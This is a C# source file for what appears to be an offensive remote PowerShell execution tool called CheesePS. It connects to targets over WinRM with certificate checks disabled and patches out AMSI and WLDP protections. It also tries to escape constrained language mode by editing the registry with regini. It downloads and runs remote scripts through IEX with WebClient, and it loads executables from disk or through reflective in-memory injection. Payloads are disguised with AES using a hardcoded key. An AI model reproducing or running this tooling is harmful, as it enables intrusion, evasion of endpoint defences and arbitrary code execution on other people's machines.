using NDesk.Options;
using System;
using System.Collections;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Security;
using System.Security.Cryptography;
using System.Text;

namespace CheesePS
{
    internal enum Format
    {
        FILE,
        STRING
    }

    internal enum ImportMethod
    {
        WEBCLIENT,
        READFILE
    }

    internal enum DecryptionMethod
    {
        POWERSHELL,
        CSHARP
    }

    internal static class Utils
    {

        public static bool PSImportRemoteResource(PowerShell ps, string resource, bool encrypted, string aes_key, ImportMethod importMethod, DecryptionMethod decryptionMethod)
        {
            if (encrypted && importMethod == ImportMethod.WEBCLIENT)
            {
                throw new NotSupportedException("Importing via WebClient doesn't support encrypted scripts");
            }
            if (importMethod == ImportMethod.WEBCLIENT)
            {
                try
                {
                    Console.Write($"  [>] Importing file: {resource}... ");
                    string code = $"IEX (New-Object Net.WebClient).DownloadString('{resource}');";
                    ps.AddScript(code).Invoke();
                    Console.WriteLine("SUCCESS");
                    return true;
                }
                catch (Exception e)
                {
                    Console.WriteLine($"FAILURE: {e}");
                    return false;
                }
            }
            else
            {
                try
                {
                    string script;
                    string decrypted = null;
                    using (var wc = new WebClient())
                    {
                        script = wc.DownloadString(resource);
                    }

                    Console.Write($"  [>] Importing file: {resource}... ");
                    string import_code = $"IEX {script};";
                    if (encrypted)
                    {
                        if (decryptionMethod == DecryptionMethod.POWERSHELL)
                        {
                            string ps_var = "$decrypted_script";
                            PSAddDecryptionRoutine(ps);
                            PSInvokeDecrypt(ps, script, aes_key, Format.STRING, ps_var);
                            import_code = $"IEX {ps_var}";
                        }
                        else if (decryptionMethod == DecryptionMethod.CSHARP)
                        {
                            decrypted = Program.DecryptScript(script, Format.STRING, aes_key, false);
                            import_code = $"IEX {decrypted};";
                        }
                        else
                        {
                            throw new NotSupportedException($"FAILURE: {decryptionMethod} not supported");
                        }
                    }
                    ps.AddScript(import_code).Invoke();
                    Console.WriteLine("SUCCESS");
                    return true;
                }
                catch (Exception e)
                {
                    Console.WriteLine($"FAILURE: {e}");
                    return false;
                }
            }
        }

        public static void PSInvokeDecrypt(PowerShell ps, string base64Script, string aes_key, Format format, string destVarName = "$PEBytes")
        {
            string code;
            try
            {
                if (format == Format.STRING)
                {
                    code = $"{destVarName} = (Invoke-DecryptScript -CipherText '{base64Script}' -Key '{aes_key}');";
                }
                else if (format == Format.FILE)
                {
                    code = $"{destVarName} = (Invoke-DecryptAssembly -CipherText '{base64Script}' -Key '{aes_key}');";
                }
                else
                {
                    throw new NotSupportedException("[-] Only FILE and STRING formats are accepted");
                }
                ps.AddScript(code).Invoke();
                return;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] FAILURE: {e.Message}");
                return;
            }
        }

        public static bool PSImportLocalResource(PowerShell ps, string resource, bool encrypted, string aes_key, DecryptionMethod decryptionMethod)
        {
            try
            {
                Console.Write($"  [>] Importing file: {resource}... ");
                string import_code;
                if (encrypted)
                {
                    string decrypted;
                    if (decryptionMethod == DecryptionMethod.POWERSHELL)
                    {
                        string encryptedScript = LoadFromFile(resource);
                        string ps_var = "$decrypted_script";
                        PSAddDecryptionRoutine(ps);
                        PSInvokeDecrypt(ps, encryptedScript, aes_key, Format.STRING, ps_var);
                        import_code = $"IEX {ps_var}";
                    }
                    else if (decryptionMethod == DecryptionMethod.CSHARP)
                    {
                        decrypted = Program.DecryptScript(resource, Format.FILE, aes_key, false);
                        import_code = $"IEX {decrypted};";
                    }
                    else
                    {
                        throw new NotSupportedException($"FAILURE: {decryptionMethod} not supported");
                    }

                    ps.AddScript(import_code).Invoke();
                }
                else
                {
                    ps.AddCommand("Import-Module").AddParameter("Name", resource).Invoke();
                }

                Console.WriteLine("SUCCESS");
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"FAILURE: {e}");
                return false;
            }
        }

        public static string Encrypt(string encryptString, string EncryptionKey = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        {
            byte[] clearBytes = Encoding.Unicode.GetBytes(encryptString);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] {
                    0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76
                });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }
                    encryptString = Convert.ToBase64String(ms.ToArray());
                }
            }
            return encryptString;
        }

        public static bool PSAddDecryptionRoutine(PowerShell ps)
        {

            string code = $@"
<#
    Remote Decryption Module
#>

function Invoke-DecryptScript
{{
    [CmdletBinding()]
    param
    (
	[Parameter(Mandatory=$True)]
	[string]$CipherText,
    [Parameter(Mandatory=$False)]
	[string]$Key
    )

    $DecryptionKey = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'

    if(-not ([string]::IsNullOrEmpty($Key))){{
        $DecryptionKey = $Key
     }}

    $cipherText = $CipherText.Replace(' ', '+')
    $decoded = [Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cipherText))
    $cipherBytes = ([System.Convert]::FromBase64String($decoded))
   
    $salt = [byte[]] (0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76);
    $pdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($DecryptionKey, $salt)
  
    $AESKey = $pdb.GetBytes(32);
    $AESIV = $pdb.GetBytes(16);
    $AES = New-Object Security.Cryptography.AesManaged
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $AES.BlockSize = 128
    $AES.KeySize = 256


    $ms = [System.IO.MemoryStream]::new()

    $cs = New-Object System.Security.Cryptography.CryptoStream(
        $ms, 
        $AES.CreateDecryptor($AESKey, $AESIV), 
        [System.Security.Cryptography.CryptoStreamMode]::Write
        );

    $cs.Write($cipherBytes, 0, $cipherBytes.Length)
    $cs.Close()
    $cleartext = [Text.Encoding]::Unicode.GetString($ms.ToArray())
    $ms.Dispose()
    
    return $cleartext;
}}

function Invoke-DecryptAssembly
{{
    [CmdletBinding()]
    param
    (
	[Parameter(Mandatory=$True)]
	[string]$CipherText,
    [Parameter(Mandatory=$False)]
	[string]$Key
    )

    $DecryptionKey = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'

    if(-not([string]::IsNullOrEmpty($Key))){{ 
        $DecryptionKey = $Key
    }}

    $cipherText = $CipherText.Replace(' ', '+')
    $decoded = [Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cipherText))
    $cipherBytes = ([System.Convert]::FromBase64String($decoded))
   
    $salt = [byte[]] (0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76);
    $pdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($DecryptionKey, $salt)
  
    $AESKey = $pdb.GetBytes(32);
    $AESIV = $pdb.GetBytes(16);
    $AES = New-Object Security.Cryptography.AesManaged
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $AES.BlockSize = 128
    $AES.KeySize = 256


    $ms = [System.IO.MemoryStream]::new()

    $cs = New-Object System.Security.Cryptography.CryptoStream(
        $ms, 
        $AES.CreateDecryptor($AESKey, $AESIV), 
        [System.Security.Cryptography.CryptoStreamMode]::Write
        );

    $cs.Write($cipherBytes, 0, $cipherBytes.Length)
    $cs.Close()
    $clearbytes = $ms.ToArray()
    $ms.Dispose()
    
    return $clearbytes;
}}";
            try
            {
                ps.AddScript($"IEX {code}").Invoke();
                return true;
            }
            catch
            {
                return false;
            }

        }

        public static string Decrypt(string cipherText, string EncryptionKey = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        {
            string decoded = Encoding.UTF8.GetString(Convert.FromBase64String(cipherText));
            cipherText = decoded.Replace(" ", "+");
            byte[] cipherBytes = Convert.FromBase64String(decoded);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] {
                    0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76
                });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipherBytes, 0, cipherBytes.Length);
                        cs.Close();
                    }
                    cipherText = Encoding.Unicode.GetString(ms.ToArray());
                }
            }
            return cipherText;
        }

        public static byte[] DecryptToBytes(string cipherText, string DecryptionKey = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        {
            byte[] clearBytes;
            cipherText = cipherText.Replace(" ", "+");
            byte[] cipherBytes = Convert.FromBase64String(cipherText);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(DecryptionKey, new byte[] {
                    0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76
                });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipherBytes, 0, cipherBytes.Length);
                        cs.Close();
                    }
                    clearBytes = ms.ToArray();
                }
            }
            return clearBytes;
        }

        internal static void CSImportLocalResource(RunspaceInvoke invoker, string module)
        {
            if (string.IsNullOrEmpty(module))
            {
                return;
            }

            try
            {
                string path = Path.GetFullPath(module);
                if (File.Exists(path))
                {
                    Console.Write($"  [>] Importing file: {path}... ");
                    invoker.Invoke($"Import-Module '{path}'");
                    Console.WriteLine("SUCCESS");

                }
                else
                {
                    throw new FileNotFoundException();
                }

            }
            catch (FileNotFoundException e)
            {
                Console.WriteLine("FAILURE");
                Console.WriteLine($"[-] Could not find file: {e.FileName}");
            }
            catch (Exception e)
            {
                Console.WriteLine("FAILURE");
                Console.WriteLine($"[-] Could not import module: {module}");
                Console.WriteLine($"  [x] Exception: {e}");
            }
        }

        internal static void CSDownloadRemoteResource(string module, ArrayList resolved_imports)
        {
            if (string.IsNullOrEmpty(module))
            {
                return;
            }
            try
            {
                string temp_path = $"C:\\Users\\Public\\{Path.GetFileNameWithoutExtension(Path.GetRandomFileName())}.ps1";
                using (var client = new WebClient())
                {
                    client.DownloadFile(module, temp_path);
                    resolved_imports.Add(temp_path);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Exception: {e}");
            }
        }

        internal static void CSDeleteDownloadedResource(ArrayList resolved_imports)
        {
            foreach (string resource in resolved_imports)
            {
                if (string.IsNullOrEmpty(resource))
                {
                    continue;
                }

                string path = Path.GetFullPath(resource);
                if (!File.Exists(path))
                {
                    continue;
                }
                try
                {
                    File.Delete(path);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] Exception: {e}");
                }
            }

        }

        internal static string LoadFromFile(string script2decrypt)
        {
            string path = Path.GetFullPath(script2decrypt);
            string scriptContent = "";

            if (!File.Exists(path))
            {
                throw new FileNotFoundException("[-] File not found.");
            }

            using (TextReader reader = File.OpenText(path))
            {
                scriptContent = string.Join("", reader.ReadToEnd());
            }
            return scriptContent;
        }

        internal static string DownloadAssembly(string execute_assembly)
        {
            string base64_assembly;
            if (execute_assembly.StartsWith("http"))
            {

                base64_assembly = new System.Net.WebClient().DownloadString(execute_assembly);
            }
            else
            {
                string path = Path.GetFullPath(execute_assembly);
                if (!File.Exists(execute_assembly))
                {
                    throw new FileNotFoundException("[-] Assembly to load not found");
                }
                base64_assembly = System.IO.File.ReadAllText(execute_assembly);
            }
            return base64_assembly;
        }
    }

    internal class Program
    {
        public const int REMOTE = 1;
        public const int LOCAL = 0;

        public static void ShowHelp(OptionSet p)
        {
            Console.WriteLine("Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }

        private static void Main(string[] args)
        {
            var help = false;
            var outstring = false;
            var target = string.Empty;
            var code = string.Empty;
            var encoded = false;
            var redirect = false;
            var domain = string.Empty;
            var username = string.Empty;
            var password = string.Empty;
            var imports = string.Empty;
            var am_si_bypass_module = string.Empty;
            var script2encript = string.Empty;
            var script2decript = string.Empty;
            var amsi_encrypted = false;
            var skip_bypass = string.Empty;
            var wldp_bypass = string.Empty;
            var wldp_bypass_encrypted = false;
            var execute_assembly = string.Empty;
            var is_dotnet = false;
            var reflective_injection = false;
            var assembly_encrypted = false;
            var imports_encrypted = false;
            var escape_lockdown = false;
            var use_ssl = false;
            var use_powershell_decryption = false;
            var display_target = string.Empty;
            DecryptionMethod decryptionMethod = DecryptionMethod.CSHARP;
            var aes_key = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";

            const int CODE_LEN_MAX = 150;

            ArrayList array_imports = new ArrayList();

            var options = new OptionSet
            {
                {"t|target=", "Target machine", o => target = o},
                {"c|code=", "Code to execute", o => code = o},
                {"e|encoded", "Indicates that provided code is base64 encoded", o => encoded = true},
                {"a|am-si-bypass=", "Uses the given PowerShell script to bypass A-M-S-I (fs, smb o http[s])", o => am_si_bypass_module = o},
                {"aX|encrypted-am-si", "Indicates that provided A.M.S.I. bypass is encrypted", o => amsi_encrypted = true},
                {"i|import=", "Imports additional PowerShell modules (fs, smb o http[s])", o => imports = o},
                {"iX|encrypted-imports", "Indicates that provided PowerShell modules are encrypted", o => imports_encrypted = true},
                {"o|outstring", "Append Out-String to code", o => outstring = true},
                {"r|redirect", "Redirect stderr to stdout", o => redirect = true},
                {"d|domain=", "Domain for alternate credentials", o => domain = o},
                {"u|username=", "Username for alternate credentials", o => username = o},
                {"p|password=", "Password for alternate credentials", o => password = o},
                {"X|encrypt=", "Encrypt a script with an hardcoded key", o => script2encript = o},
                {"D|decrypt=", "Test decryption of a script with an hardcoded key", o => script2decript = o},
                {"n|skip-bypass=", "Skip A.M.S.I (A), WLDP (W) or ALL (*) Bypass techniques", o => skip_bypass = o},
                {"l|lockdown-escape", "Try to enable PowerShell FullLanguage mode using REGINI", o => escape_lockdown = true},
                {"w|wldp-bypass=", "Uses the given PowerShell script to bypass WLDP (fs, smb o http[s])", o => wldp_bypass = o},
                {"wX|encrypted-wldp", "Indicates that provided WLDP bypass is encrypted", o => wldp_bypass_encrypted = true},
                {"x|executable=", "[Download and] Execute given executable", o => execute_assembly = o},
                {"xX|encrypted-executable", "Indicates that provided Exe/DLL is encrypted", o => assembly_encrypted = true},
                {"xCS|executable-csharp", "Indicates that the executable provided is C# (.NET)", o => is_dotnet = true},
                {"R|reflective-injection", "Uses Invoke-ReflectivePEInjection to load the assmebly from memory (requires Invoke-ReflectivePEInjection to be imported!)", o => reflective_injection = true},
                {"P|powershell-decrypt", "Force use of PowerShell-based decryption", o => use_powershell_decryption = true},
                {"k|encryption-key=", "Uses the provided key for encryption/decryption", o => aes_key = o},
                {"ssl", "Force use of SSL", o => use_ssl = true},
                {"h|?|help", "Show Help", o => help = true}
            };

            try
            {
                options.Parse(args);

                if (help)
                {
                    ShowHelp(options);
                    return;
                }

                if (use_powershell_decryption)
                {
                    decryptionMethod = DecryptionMethod.POWERSHELL;
                }

                if (!string.IsNullOrEmpty(skip_bypass))
                {
                    bool valid = false;
                    char[] allowed_options = new char[] { (char)0x41, (char)0x57, (char)0x2a };
                    foreach (char c in allowed_options)
                    {
                        if (skip_bypass.Equals(c.ToString()))
                        {
                            valid = true;
                            break;
                        }
                    }
                    if (!valid)
                    {
                        throw new ArgumentException("[-] Unknown option for --skip-bypass, allowed are: A, W and *");
                    }
                }

                if (!string.IsNullOrEmpty(script2encript))
                {
                    EncryptScript(script2encript, aes_key);
                    return;
                }

                if (!string.IsNullOrEmpty(script2decript))
                {
                    DecryptScript(script2decript, Format.FILE, aes_key, true);
                    return;
                }

                if (string.IsNullOrEmpty(code))
                {
                    ShowHelp(options);
                    return;
                }

                if (reflective_injection && string.IsNullOrEmpty(execute_assembly))
                {
                    throw new ArgumentNullException("[-] Reflective Injection requires an Assembly to load!");
                }

                display_target = target;
                if (string.IsNullOrEmpty(target))
                {
                    Console.WriteLine("[*] No target given, using current machine name");
                    target = null;
                    display_target = Environment.MachineName;
                }
                if (!string.IsNullOrEmpty(imports))
                {
                    char delim = (char)0x2c;
                    foreach (string im in imports.Split(delim))
                    {
                        array_imports.Add(im);
                    }
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
                ShowHelp(options);
                return;
            }

            try
            {
                WSManConnectionInfo conn;
                if (!string.IsNullOrEmpty(target))
                {
                    Uri uri;
                    if (!use_ssl)
                    {
                        uri = new Uri($"http://{target}:5985/WSMAN");
                    }
                    else
                    {
                        uri = new Uri($"https://{target}:5986/WSMAN");
                    }
                    conn = new WSManConnectionInfo(uri);
                    conn.SkipCACheck = true;
                    conn.SkipCNCheck = true;

                    if ((domain ?? username ?? password) == null || (domain ?? username ?? password) == string.Empty)
                    {
                        var pass = new SecureString();
                        foreach (var c in password)
                            pass.AppendChar(c);

                        var cred = new PSCredential($"{domain}\\{username}", pass);
                        conn.Credential = cred;
                    }

                }
                else
                {
                    conn = null;
                }


                if (escape_lockdown)
                {
                    using (var runspace = CreateRunSpace(conn))
                    {
                        runspace.Open();

                        Console.WriteLine("[*] Attempting to enable FullLanguage Mode");
                        if (!AttemptRegalBypass(runspace))
                        {
                            Console.WriteLine($"[-] Could not set Lockdown Policy -> FullLanguage on {display_target}");
                        }
                        else
                        {
                            Console.WriteLine("[+] Enabled FullLanguage Mode");
                        }
                    }
                }

                using (var runspace = CreateRunSpace(conn))
                {
                    runspace.Open();

                    PowerShell ps = PowerShell.Create();
                    ps.Runspace = runspace;

                    if (!UnrestrictedPolicyByPowerShell(ps))
                    {
                        Console.WriteLine($"[-] Could not set Execution-Policy -> Unrestricted on {display_target}");
                    }
                    else
                    {
                        Console.WriteLine("[+] Set Execution-Policy -> Unrestricted");
                    }

                    if (skip_bypass.Equals("W") || string.IsNullOrEmpty(skip_bypass))
                    {

                        Console.WriteLine("[*] Attempt A.M.S.I Bypass");
                        if (string.IsNullOrEmpty(am_si_bypass_module) && !runspace.RunspaceIsRemote)
                        {
                            if (!BuiltinAmsiBypass(ps))
                            {
                                Console.WriteLine("[*] WARNING: A.M.S.I Bypass FAILED!");
                            }
                        }
                        else if (!BypassWithRemoteModule(ps, am_si_bypass_module, amsi_encrypted, aes_key, decryptionMethod))
                        {
                            Console.WriteLine("[*] WARNING: A.M.S.I Bypass FAILED!");

                        }
                        else
                        {
                            Console.WriteLine("[+] A.|\\/|SI -> Patched!");
                        }
                    }

                    if (skip_bypass.Equals("A") || string.IsNullOrEmpty(skip_bypass))
                    {

                        Console.WriteLine("[*] Attempt WLDP Bypass");
                        if (string.IsNullOrEmpty(am_si_bypass_module) && !runspace.RunspaceIsRemote)
                        {
                            if (!BuiltinWldpBypass(ps))
                            {
                                Console.WriteLine("[*] WARNING: WLDP Bypass FAILED!");
                            }
                        }
                        else if (!BypassWithRemoteModule(ps, wldp_bypass, wldp_bypass_encrypted, aes_key, decryptionMethod))
                        {
                            Console.WriteLine("[*] WARNING: WLDP Bypass FAILED!");

                        }
                        else
                        {
                            Console.WriteLine("[+] WLDP -> Patched!");
                        }
                    }

                    bool success = false;
                    if (!string.IsNullOrEmpty(execute_assembly))
                    {
                        Console.Write("[*] Loading assembly to execute... ");
                        code = PSLoadAssembly(ps, code, execute_assembly, assembly_encrypted, aes_key, reflective_injection, is_dotnet, decryptionMethod, ref success);
                        if (success)
                        {
                            Console.WriteLine("SUCCESS");
                        }
                        else
                        {
                            Console.WriteLine("FAILURE");
                        }

                    }

                    string display_command = code;
                    Console.WriteLine("[*] Importing modules");
                    ImportModulesByPowerShell(ps, array_imports, imports_encrypted, aes_key, decryptionMethod);
                    if (code.Length > CODE_LEN_MAX)
                    {
                        display_command = code.Substring(0, 45) + " ... " + code.Substring(code.Length - 45);
                    }
                    Console.WriteLine($"[*] Executind command: {display_command}");
                    ExecuteByPowerShell(ps, code, redirect, outstring, encoded);



                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }
        }

        private static string PSLoadAssembly(PowerShell ps, string code, string execute_assembly, bool assembly_encrypted, string aes_key, bool reflective_injection, bool is_dotnet, DecryptionMethod decryptionMethod, ref bool ret)
        {
            string destVarName = "$PEBytes";
            string execute_stub = $"{destVarName} = [byte[]] (";

            try
            {
                string destination = $"C:\\Users\\Public\\{Path.GetFileNameWithoutExtension(Path.GetRandomFileName())}.exe";

                if (decryptionMethod == DecryptionMethod.CSHARP || !assembly_encrypted)
                {
                    byte[] assembly = LoadAssembly(execute_assembly, assembly_encrypted, aes_key);

                    execute_stub += $"0x{BitConverter.ToString(assembly).Replace("-", ", 0x")} );";
                }
                else if (decryptionMethod == DecryptionMethod.POWERSHELL && assembly_encrypted)
                {
                    Utils.PSAddDecryptionRoutine(ps);
                    string encrypted_assembly = Utils.DownloadAssembly(execute_assembly);
                    Utils.PSInvokeDecrypt(ps, encrypted_assembly, aes_key, Format.FILE, destVarName);
                    execute_assembly = "";
                    //execute_stub = $"{destVarName} = (Invoke-DecryptToBytes -CipherText {encrypted_assembly} -Key {aes_key});";
                }
                else
                {
                    throw new NotSupportedException($"Method {decryptionMethod} not supported");
                }
                if (!reflective_injection)
                {
                    execute_stub += $"[io.file]::WriteAllBytes('{destination}',{destVarName});sleep 1;";
                    execute_stub += $"& '{destination}' {code}";

                }
                else
                {
                    if (!is_dotnet)
                    {
                        // execute_stub += $"Invoke-ReflectivePEInjection -ErrorAction silentlycontinue -PEBytes $PEBytes -ExeArgs '{code}' ";
                        execute_stub += $"Invoke-ReflectivePEInjection -PEBytes {destVarName} -ExeArgs '{code}' | Out-String";
                    }
                    else
                    {
                        string arguments = String.Join("\",\"", code.Split(' '));
                        if (String.IsNullOrEmpty(arguments))
                        {
                            execute_stub += $"[string[]] $pargs =@(); [object[]] $arguments =@(, $pargs);";
                        }
                        else
                        {
                            execute_stub += $"[string[]] $pargs =@(, \"{arguments}\" ); [object[]] $arguments =@(, $pargs);";
                        }


                        execute_stub += $"$obj = [System.Reflection.Assembly]::Load({destVarName}); $obj.EntryPoint.Invoke($null, $arguments)";
                    }
                }

                ret = true;
                return execute_stub;
            }
            catch
            {
                ret = false;
                return code;
            }
        }

        private static bool AttemptRegalBypass(Runspace rs)
        {
            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = rs;
                try
                {
                    string filename = @"C:\Users\Public\perm.txt";
                    ps.AddScript($@"echo 'HKLM\System\CurrentControlSet\Control\Session Manager\Environment [1 5 7]' > {filename};
echo '    __PSLockdownPolicy = REG_SZ 8' >> {filename};
regini {filename}; 
Remove-Item -Path {filename} -Force;");

                    ps.Invoke();
                    return true;
                }
                catch //(Exception e)
                {
                    //Console.WriteLine($"Exception: {e}");
                    return false;
                }
            }
        }

        private static byte[] LoadAssembly(string execute_assembly, bool encrypted, string aes_key)
        {
            byte[] assembly_bytes;

            if (!encrypted)
            {
                if (execute_assembly.StartsWith("http"))
                {
                    assembly_bytes = new System.Net.WebClient().DownloadData(execute_assembly);
                }
                else
                {
                    string path = Path.GetFullPath(execute_assembly);
                    if (!File.Exists(execute_assembly))
                    {
                        throw new FileNotFoundException("[-] Assembly to load not found");
                    }
                    assembly_bytes = System.IO.File.ReadAllBytes(execute_assembly);
                }
            }
            else
            {
                string base64_assembly = Utils.DownloadAssembly(execute_assembly);

                assembly_bytes = Utils.DecryptToBytes(base64_assembly, aes_key);

            }
            return assembly_bytes;
        }

        public static string DecryptScript(string script2decrypt, Format format, string aes_key, bool print)
        {
            string encrypted = "";
            string decrypted;
            if (format == Format.FILE)
            {
                encrypted = Utils.LoadFromFile(script2decrypt);
            }
            else if (format == Format.STRING)
            {
                encrypted = script2decrypt;
            }
            else
            {
                throw new FormatException("Format not supported");
            }
            try
            {
                decrypted = Utils.Decrypt(encrypted, aes_key);
                if (print)
                    Console.Write(decrypted);
                return decrypted;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] ERROR: {e.Message}");
                Environment.Exit(-1);
                return null;
            }
        }

        public static void EncryptScript(string script2encript, string aes_key)
        {
            string path = Path.GetFullPath(script2encript);

            if (!File.Exists(path))
            {
                Console.WriteLine("[-] File not found.");
            }
            try
            {
                using (StreamReader reader = File.OpenText(path))
                {
                    string text = reader.ReadToEnd();
                    string encrypted = Utils.Encrypt(text, aes_key);
                    string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(encrypted));
                    Console.Write(encoded);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] ERROR: {e.Message}");
            }
        }

        private static void ImportModulesByRunspaceInvoker(RunspaceInvoke invoker, ArrayList array_imports)
        {

            ArrayList resolved_imports = new ArrayList();

            if (array_imports.Count > 0)
            {
                foreach (string module in array_imports)
                {
                    if (string.IsNullOrEmpty(module))
                    {
                        continue;
                    }
                    if (module.StartsWith("http"))
                    {
                        Utils.CSDownloadRemoteResource(module, resolved_imports);
                    }
                    else
                    {
                        resolved_imports.Add(module);
                    }
                }

                if (resolved_imports.Count > 0)
                {
                    foreach (string module in resolved_imports)
                    {
                        Utils.CSImportLocalResource(invoker, module);
                    }
                }
            }
        }
        private static void ImportModulesByPowerShell(PowerShell ps, ArrayList array_imports, bool encrypted, string aes_key, DecryptionMethod decryptionMethod)
        {
            if (array_imports.Count > 0)
            {
                foreach (string module in array_imports)
                {
                    if (string.IsNullOrEmpty(module))
                    {
                        continue;
                    }
                    if (module.StartsWith("http"))
                    {
                        Utils.PSImportRemoteResource(ps, module, encrypted, aes_key, ImportMethod.READFILE, decryptionMethod);
                    }
                    else
                    {
                        Utils.PSImportLocalResource(ps, module, encrypted, aes_key, decryptionMethod);
                    }
                }
            }
        }

        private static bool UnrestrictedPolicyByRunspaceInvoker(RunspaceInvoke invoker, Runspace runspace)
        {
            try
            {
                invoker.Invoke("Set-ExecutionPolicy Unrestricted -Scope Process");
                return true;
            }
            catch (Exception e) { Console.WriteLine($"[-] {e}"); return false; }
        }

        private static bool UnrestrictedPolicyByPowerShell(PowerShell ps)
        {
            try
            {
                ps.AddCommand("Set-ExecutionPolicy").AddParameter("ExecutionPolicy", "Unrestricted").AddParameter("Scope", "Process").Invoke();
                return true;
            }
            catch (Exception e) { Console.WriteLine($"[-] {e}"); return false; }
        }


        private static bool BypassWithRemoteModule(PowerShell ps, string bypass_uri, bool encrypted, string aes_key, DecryptionMethod decryptionMethod)
        {
            if (string.IsNullOrEmpty(bypass_uri))
            {
                return false;
            }
            if (bypass_uri.StartsWith("http"))
            {
                if (Utils.PSImportRemoteResource(ps, bypass_uri, encrypted, aes_key, ImportMethod.READFILE, decryptionMethod))
                {
                    ps.AddCommand("Invoke-Bypass").Invoke();
                    return true;
                }
                return false;
            }
            else
            {
                if (Utils.PSImportLocalResource(ps, bypass_uri, encrypted, aes_key, decryptionMethod))
                {
                    ps.AddCommand("Invoke-Bypass").Invoke();
                    return true;
                }
                return false;
            }
        }

        private static bool BuiltinAmsiBypass(PowerShell ps)
        {
            try
            {
                AttemptAmsiBypass(ps);
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"FAILURE: {e}");
                return false;
            }
        }


        private static bool BuiltinWldpBypass(PowerShell ps)
        {
            try
            {
                AttemptWldpBypass(ps);
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"FAILURE: {e}");
                return false;
            }
        }

        private static void AttemptWldpBypass(PowerShell ps)
        {
            WldpBypass.InvokeBypass(ps);
        }

        private static void ExecuteByRunspace(Runspace runspace, string code, bool redirect, bool outstring, bool encoded)
        {
            using (var posh = PowerShell.Create())
            {
                posh.Runspace = runspace;
                if (encoded)
                    code = Encoding.Default.GetString(Convert.FromBase64String(code)).Replace("\0", "");
                if (redirect)
                    posh.AddScript("& { " + code + " } *>&1");
                else
                    posh.AddScript(code);
                if (outstring) posh.AddCommand("Out-String");
                var results = posh.Invoke();
                var output = string.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
                Console.WriteLine(output);
            }

            runspace.Close();
        }
        private static void ExecuteByPowerShell(PowerShell ps, string code, bool redirect, bool outstring, bool encoded)
        {

            if (encoded)
                code = Encoding.Default.GetString(Convert.FromBase64String(code)).Replace("\0", "");
            if (redirect)
                ps.AddScript("& { " + code + " } *>&1");
            else
                ps.AddScript(code);
            if (outstring) ps.AddCommand("Out-String");
            var results = ps.Invoke();
            var output = string.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
            Console.WriteLine(output);

        }


        private static Runspace CreateRunSpace(WSManConnectionInfo connectionInfo)
        {
            if (connectionInfo == null)
            {
                return RunspaceFactory.CreateRunspace();
            }
            else
            {
                return RunspaceFactory.CreateRunspace(connectionInfo);
            }
        }

        static bool AttemptAmsiBypass(PowerShell ps)
        {
            try
            {
                AmsiBypass.InvokeBypass(ps);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] FATAL ERROR: Could not bypass AMSI");
                Console.WriteLine($"    [-] Exeption: {ex}");
                Console.WriteLine($"    [-] Description: {ex.Message}");
                return false;
            }
        }
    }
}